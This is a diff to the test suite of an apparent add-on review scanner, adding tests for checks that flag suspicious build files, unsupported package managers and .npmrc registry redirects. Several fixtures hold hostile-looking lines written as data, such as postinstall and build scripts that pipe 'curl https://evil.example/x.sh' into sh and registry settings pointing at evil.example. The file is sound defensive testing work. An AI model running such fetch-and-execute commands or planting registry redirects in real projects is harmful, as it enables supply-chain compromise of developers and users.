@@ -36,6 +36,9 @@ import disguisedStylesheet from "../../src/checks/rules/disguised-stylesheet.js"
 import disguisedTransmission from "../../src/checks/rules/disguised-transmission.js";
 import unparsableFile from "../../src/checks/rules/unparsable-file.js";
 import dataExfiltration from "../../src/checks/rules/data-exfiltration.js";
+import undeclaredBuildSource from "../../src/checks/rules/undeclared-build-source.js";
+import unsupportedBuildTool from "../../src/checks/rules/unsupported-build-tool.js";
+import buildRegistryRedirect from "../../src/checks/rules/build-registry-redirect.js";
 import cleartextTransmission from "../../src/checks/rules/cleartext-transmission.js";
 import privacyPolicy from "../../src/checks/rules/privacy-policy.js";
 import nativeMessaging from "../../src/checks/rules/native-messaging.js";
@@ -589,6 +592,9 @@ test("checks carry the scs mode tag (false=XPI-only, true=SCS-only, undefined=bo
   assert.equal(scs("unused-files"), undefined);
   assert.equal(scs("unused-files-recheck"), undefined);
   assert.equal(scs("unpopular-source-dependency"), true); // SCS-only dep audit
+  assert.equal(scs("undeclared-build-source"), true); // SCS-only build review
+  assert.equal(scs("unsupported-build-tool"), true); // SCS-only build policy
+  assert.equal(scs("build-registry-redirect"), true); // SCS-only build policy
   assert.equal(scs("eval-call"), undefined); // a code check: both modes
   assert.equal(scs("unknown-api"), undefined);
 });
@@ -607,7 +613,7 @@ test("every check declares a valid input; the input:xpi set is exactly the pinne
   const checks = await loadChecks(loadRegistry());
   for (const c of checks) {
     assert.ok(
-      c.input === "auto" || c.input === "xpi",
+      c.input === "auto" || c.input === "xpi" || c.input === "build",
       `check "${c.id}" has an invalid input ${JSON.stringify(c.input)}`
     );
   }
@@ -630,6 +636,18 @@ test("every check declares a valid input; the input:xpi set is exactly the pinne
     "trademark-violation",
     "unrecognized-manifest-key",
     "unused-files",
+  ]);
+  // input: build reads the SCS build files (archive minus source minus node_modules).
+  // The build-review LLM check plus the two deterministic build-policy checks;
+  // extending this set is deliberate too.
+  const build = checks
+    .filter((c) => c.input === "build")
+    .map((c) => c.id)
+    .sort();
+  assert.deepEqual(build, [
+    "build-registry-redirect",
+    "undeclared-build-source",
+    "unsupported-build-tool",
   ]);
 });
 
@@ -675,6 +693,237 @@ test("an input:xpi LLM check adjudicates over its routed (XPI) addon", async () 
   assert.equal(seenAddon, xpi); // the model read the XPI's files, not a source addon
 });
 
+// ---- undeclared-build-source (SCS-only LLM build review) ----
+
+// ONE whole-build candidate over the ENTIRE routed corpus: loadScsBuildFiles already
+// excluded the source / node_modules / dotfiles, so the check sends EVERY file it gets
+// (no allow-list), anchored at package.json, with NO per-step artifact override.
+test("undeclared-build-source builds ONE whole-build candidate over all routed files", () => {
+  const mk = (obj) =>
+    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
+  const addon = {
+    files: mk({
+      "package.json":
+        '{"name":"x","scripts":{"postinstall":"curl https://e/x|sh"}}',
+      "package-lock.json": "{}",
+      "webpack.config.js": "module.exports={}",
+      "scripts/build.sh": "echo build",
+      "README.md": "# how to build",
+    }),
+  };
+  const out = undeclaredBuildSource.run({ addon, llm: {} });
+  assert.equal(out.llm.candidates.length, 1);
+  assert.equal(out.llm.candidates[0].id, "BUILD");
+  assert.equal(out.llm.candidates[0].file, "package.json"); // the anchor
+  assert.ok(!("addon" in out.llm)); // no step.addon override - reads its routed ctx.addon
+  // The corpus is EVERY routed file, unfiltered.
+  assert.deepEqual([...out.llm.candidates[0].corpus].sort(), [
+    "README.md",
+    "package-lock.json",
+    "package.json",
+    "scripts/build.sh",
+    "webpack.config.js",
+  ]);
+});
+
+// With no package.json, the candidate anchors at the first routed file.
+test("undeclared-build-source anchors at the first file when there is no package.json", () => {
+  const mk = (obj) =>
+    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
+  const out = undeclaredBuildSource.run({
+    addon: { files: mk({ Makefile: "all:\n\techo hi", "build.sh": "echo" }) },
+    llm: {},
+  });
+  assert.equal(out.llm.candidates[0].file, "Makefile"); // first key
+  assert.deepEqual([...out.llm.candidates[0].corpus].sort(), [
+    "Makefile",
+    "build.sh",
+  ]);
+});
+
+// Clean-skip ONLY when there are no build files (empty corpus): loadScsBuildFiles
+// yields empty when the review source is the whole submission, and the
+// invalid-Experiment fallback shape {files:new Map()} lands here too. A non-empty
+// corpus - even just package.json + lock - is reviewed (no allow-list gate).
+test("undeclared-build-source skips cleanly only when there are no build files", () => {
+  const mk = (obj) =>
+    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
+  assert.deepEqual(undeclaredBuildSource.run({}), { findings: [] });
+  assert.deepEqual(undeclaredBuildSource.run({ addon: { files: new Map() } }), {
+    findings: [],
+  });
+  // package.json + lock alone is now a reviewed build.
+  const reviewed = undeclaredBuildSource.run({
+    addon: { files: mk({ "package.json": "{}", "package-lock.json": "{}" }) },
+    llm: {},
+  });
+  assert.equal(reviewed.llm.candidates.length, 1);
+});
+
+// The structured verdict maps: a substantiated fail -> an error finding whose
+// data.explanation is the model's reason; a fail with no reason, pass, or a missing
+// verdict (the model errored) -> an extended-review note (explanation + build steps),
+// never a specifics-free error and never any offline "not reviewed" text.
+test("undeclared-build-source resolve maps fail/pass/unsure (a fail needs a reason)", () => {
+  const addon = {
+    files: new Map([
+      ["build.sh", Buffer.from("x")],
+      ["package.json", Buffer.from('{"scripts":{"b":"x"}}')],
+    ]),
+  };
+  const { llm } = undeclaredBuildSource.run({ addon, llm: {} });
+
+  const fail = llm.resolve(
+    new Map([
+      [
+        "BUILD",
+        {
+          verdict: "fail",
+          reason: "curls evil.com",
+          additionalInformation: "x",
+        },
+      ],
+    ])
+  );
+  assert.equal(fail.findings.length, 1);
+  assert.equal(fail.findings[0].data.explanation, "curls evil.com");
+  assert.equal(fail.manual.length, 0);
+
+  // A fail with an empty or whitespace reason cannot substantiate a rejection (the
+  // finding anchors at the manifest, so the reason is its only account of what is
+  // undeclared) - it drops to manual review like an unsure verdict, never a
+  // specifics-free error and never any "not reviewed" text.
+  // Empty, whitespace, and zero-width-only reasons are all "no substance" -> manual.
+  for (const emptyReason of ["", "   ", "\u200b", "\ufeff\u200d"]) {
+    const failEmpty = llm.resolve(
+      new Map([
+        [
+          "BUILD",
+          { verdict: "fail", reason: emptyReason, additionalInformation: "" },
+        ],
+      ])
+    );
+    assert.equal(failEmpty.findings.length, 0);
+    assert.equal(failEmpty.manual.length, 1);
+    assert.equal(failEmpty.manual[0].data.explanation, emptyReason);
+  }
+
+  // A non-string reason (defensive - coerceResult guarantees string|null on the live
+  // path) must not crash the guard; it is treated as no reason -> manual.
+  const failNonString = llm.resolve(
+    new Map([["BUILD", { verdict: "fail", reason: 42 }]])
+  );
+  assert.equal(failNonString.findings.length, 0);
+  assert.equal(failNonString.manual.length, 1);
+  assert.equal(failNonString.manual[0].data.explanation, "");
+
+  const pass = llm.resolve(
+    new Map([
+      [
+        "BUILD",
+        {
+          verdict: "pass",
+          reason: "clean build",
+          additionalInformation: "npm ci && npm run build",
+        },
+      ],
+    ])
+  );
+  assert.equal(pass.findings.length, 0);
+  assert.equal(pass.manual.length, 1);
+  assert.equal(pass.manual[0].data.explanation, "clean build");
+  assert.equal(
+    pass.manual[0].data.buildInstructions,
+    "npm ci && npm run build"
+  );
+
+  // A missing verdict (model call errored) -> unsure -> extended review, not offline.
+  const errored = llm.resolve(new Map());
+  assert.equal(errored.findings.length, 0);
+  assert.equal(errored.manual.length, 1);
+  assert.doesNotMatch(errored.manual[0].data.explanation, /not reviewed/i);
+});
+
+// Offline (no ctx.llm): the check has NO offline branch - it returns its llm step,
+// and the orchestrator's no-token path defaults the candidate to unsure -> one manual
+// item (empty data slots; the registry text owns the wording). The check stays
+// prose-free even offline.
+test("undeclared-build-source offline (no LLM) yields one manual item via the unsure path", async () => {
+  const mk = (obj) =>
+    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
+  const buildFiles = {
+    files: mk({
+      "package.json": '{"scripts":{"b":"x"}}',
+      "scripts/build.sh": "x",
+    }),
+  };
+  const [check] = await loadChecks(loadRegistry(), {
+    only: ["undeclared-build-source"],
+  });
+  const ctx = {
+    addon: buildFiles,
+    jsSources: [],
+    schema,
+    mode: "scs",
+    options: {},
+    // no ctx.llm - offline
+  };
+  const out = await runOneCheck(withManifest(ctx), check, "[1/1]");
+  assert.equal(out.findings.length, 0);
+  assert.equal(out.manualItems.length, 1);
+  assert.equal(out.manualItems[0].ruleId, "undeclared-build-source");
+  assert.equal(out.manualItems[0].data.explanation, ""); // empty slot; registry owns text
+});
+
+// End to end through the orchestrator: `input: build` routes ctx.addon to the build
+// files (the pipeline's buildCtx; here the routed ctx is passed to runOneCheck), so
+// the model reads them (req.addon === the routed ctx.addon), and a fail is stamped an
+// error finding at the anchor whose response carries the explanation.
+test("undeclared-build-source reads its routed (build) ctx.addon and stamps a fail as error", async () => {
+  const mk = (obj) =>
+    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
+  const buildFiles = {
+    files: mk({
+      "package.json": '{"name":"x"}',
+      "package-lock.json": "{}",
+      "scripts/build.sh": "curl https://evil.example/x.sh | sh",
+    }),
+  };
+  const [check] = await loadChecks(loadRegistry(), {
+    only: ["undeclared-build-source"],
+  });
+  assert.equal(check.input, "build"); // routed by the registry input
+  let seenAddon;
+  const ctx = {
+    addon: buildFiles, // the orchestrator routed this to the build files (buildCtx)
+    jsSources: [],
+    schema,
+    mode: "scs",
+    options: {},
+    llm: {
+      evaluate: async (req) => {
+        seenAddon = req.addon;
+        return new Map(
+          req.candidates.map((c) => [
+            c.id,
+            {
+              verdict: "fail",
+              reason: "fetches x.sh from https://evil.example",
+              additionalInformation: "",
+            },
+          ])
+        );
+      },
+    },
+  };
+  const out = await runOneCheck(withManifest(ctx), check, "[1/1]");
+  assert.equal(seenAddon, buildFiles); // the model read the routed build files
+  assert.equal(out.findings.length, 1);
+  assert.equal(out.findings[0].file, "package.json"); // the anchor
+  assert.equal(out.findings[0].severity, SEVERITY.ERROR); // registry stamps error
+  assert.match(out.findings[0].data.explanation, /evil\.example/);
+});
+
 // scs-recheck: the per-site (file:line) recheck producers are marked so runChecks
 // routes their unsure sites to manual review in SCS (their source line numbers
 // cannot bridge to the XPI behavioral summary); other recheck producers are not.
@@ -685,6 +934,138 @@ test("the per-site recheck producers carry scsRecheck=false", async () => {
   assert.equal(scsRecheck("disguised-transmission"), false);
   // A non-line-anchored recheck (re-judged fine against the XPI summary) is not.
   assert.equal(scsRecheck("unused-permission"), undefined);
+});
+
+// ---- unsupported-build-tool (SCS deterministic: npm/pnpm only) ----
+
+// A committed yarn/bun fingerprint - a lockfile or the package.json "packageManager"
+// field - is a hard reject: the offending tool is the finding's item, anchored at the
+// fingerprint file. npm/pnpm (or no evidence) is clean.
+test("unsupported-build-tool rejects yarn/bun by lockfile or packageManager field", () => {
+  const run = (obj) =>
+    unsupportedBuildTool.run({
+      addon: {
+        files: new Map(
+          Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)])
+        ),
+      },
+    });
+  const one = (out, tool, file) => {
+    assert.equal(out.length, 1);
+    assert.equal(out[0].item, tool);
+    assert.equal(out[0].file, file);
+  };
+  one(run({ "yarn.lock": "" }), "yarn", "yarn.lock");
+  one(run({ "bun.lockb": "" }), "bun", "bun.lockb");
+  one(run({ "bunfig.toml": "" }), "bun", "bunfig.toml");
+  one(
+    run({ "package.json": '{"packageManager":"yarn@4.1.0"}' }),
+    "yarn",
+    "package.json"
+  );
+  // npm/pnpm and no-evidence are clean.
+  assert.deepEqual(
+    run({
+      "package.json": '{"packageManager":"pnpm@9"}',
+      "pnpm-lock.yaml": "",
+    }),
+    []
+  );
+  assert.deepEqual(
+    run({ "package.json": "{}", "package-lock.json": "{}" }),
+    []
+  );
+  assert.deepEqual(
+    unsupportedBuildTool.run({ addon: { files: new Map() } }),
+    []
+  );
+});
+
+// ---- build-registry-redirect (SCS deterministic: .npmrc registry) ----
+
+// ANY registry= / @scope:registry= in .npmrc is a hard reject (a legit build never sets
+// the registry) - the raw value is the item, anchored at the line; the value is not
+// parsed. Auth lines, comments, unrelated keys, and no .npmrc are clean.
+test("build-registry-redirect rejects any registry setting in .npmrc", () => {
+  const run = (npmrc) =>
+    buildRegistryRedirect.run({
+      addon: { files: new Map([[".npmrc", Buffer.from(npmrc)]]) },
+    });
+  const one = (out, item) => {
+    assert.equal(out.length, 1);
+    assert.equal(out[0].item, item);
+    assert.equal(out[0].file, ".npmrc");
+    assert.equal(out[0].loc.line, 1);
+  };
+  one(run("registry=https://evil.example/"), "https://evil.example/");
+  one(
+    run("@acme:registry=https://npm.pkg.github.com"),
+    "https://npm.pkg.github.com"
+  );
+  one(run("registry=${NPM_REG}"), "${NPM_REG}");
+  // npm's `[]` array-append syntax sets the same registry config -> also rejected;
+  // `registry[0]=` is NOT honored by npm, so it stays clean.
+  one(run("registry[]=https://evil/"), "https://evil/");
+  one(run("@acme:registry[]=https://x/"), "https://x/");
+  assert.deepEqual(run("registry[0]=https://evil/"), []);
+  // Even the public registry, a quoted value, and an uppercase key are rejected - the
+  // value is never parsed, so nothing slips past on host/quote/case.
+  assert.equal(run("registry=https://registry.npmjs.org/").length, 1);
+  assert.equal(run('registry="https://registry.npmjs.org/"').length, 1);
+  assert.equal(run("REGISTRY=https://evil/").length, 1);
+  // Auth lines, comments, unrelated keys, and no .npmrc are clean.
+  assert.deepEqual(run("//registry.npmjs.org/:_authToken=abc"), []);
+  assert.deepEqual(run("# registry=https://evil/"), []);
+  assert.deepEqual(run("save-exact=true"), []);
+  assert.deepEqual(
+    buildRegistryRedirect.run({ addon: { files: new Map() } }),
+    []
+  );
+});
+
+// A disallowed fingerprint is matched at ANY depth (a build run from a subfolder), by
+// basename - not just at the root.
+test("unsupported-build-tool detects nested lockfiles + packageManager", () => {
+  const run = (obj) =>
+    unsupportedBuildTool.run({
+      addon: {
+        files: new Map(
+          Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)])
+        ),
+      },
+    });
+  const nested = run({
+    "frontend/yarn.lock": "",
+    "frontend/package.json": "{}",
+  });
+  assert.equal(nested.length, 1);
+  assert.equal(nested[0].item, "yarn");
+  assert.equal(nested[0].file, "frontend/yarn.lock");
+  const pm = run({ "app/package.json": '{"packageManager":"bun@1"}' });
+  assert.equal(pm[0].item, "bun");
+  assert.equal(pm[0].file, "app/package.json");
+  // A nested npm build is clean.
+  assert.deepEqual(
+    run({ "frontend/package.json": "{}", "frontend/package-lock.json": "{}" }),
+    []
+  );
+});
+
+// Nested .npmrc (a build that runs from a subfolder) is scanned too; the reject is on
+// the mere presence of the registry key, not its value.
+test("build-registry-redirect scans nested .npmrc and rejects any registry key", () => {
+  const at = (path, npmrc) =>
+    buildRegistryRedirect.run({
+      addon: { files: new Map([[path, Buffer.from(npmrc)]]) },
+    });
+  const nested = at("frontend/.npmrc", "registry=https://evil.example/");
+  assert.equal(nested.length, 1);
+  assert.equal(nested[0].file, "frontend/.npmrc");
+  assert.equal(nested[0].item, "https://evil.example/");
+  // The public registry, a scoped registry, and an uppercase key are all rejected.
+  assert.equal(at(".npmrc", "registry=https://registry.npmjs.org/").length, 1);
+  assert.equal(at(".npmrc", "@a:registry=https://x/").length, 1);
+  assert.equal(at(".npmrc", "REGISTRY=https://evil/").length, 1);
 });
 
 // ---- manual-checks diff gate (the "Forked add-on" reminder) ----
